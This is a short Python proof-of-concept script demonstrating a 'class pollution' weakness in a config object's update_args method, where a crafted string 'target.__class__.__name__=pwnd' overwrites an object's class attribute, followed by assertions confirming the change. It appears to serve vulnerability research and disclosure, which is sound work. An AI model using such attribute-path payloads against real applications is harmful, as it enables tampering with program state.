# CLASS POLLUTION PROOF OF CONCEPT (PoC)
# Class Pollution Func: AttrDict.update_args
# Type: get-attr-set-attr

import sys, os
sys.path.insert(0, os.path.join(os.path.dirname(__file__), 'repo', 'examples', 'FasterRCNN'))

from config import config as cfg

class Target: pass
target = Target()

# Attach target to the config object
cfg.target = target

payload_value = "pwnd"
PAYLOAD = ["target.__class__.__name__=pwnd"]

def run_poc():
  cfg.update_args(PAYLOAD)

def verify_poc():
  assert target.__class__.__name__ != payload_value, "Pre-condition failed"
  run_poc()
  print(f"After: target.__class__.__name__ = {target.__class__.__name__}")
  assert target.__class__.__name__ == payload_value, "Class pollution failed!"
  print("[Pass] Class pollution PoC verified!")

if __name__ == "__main__":
  verify_poc()
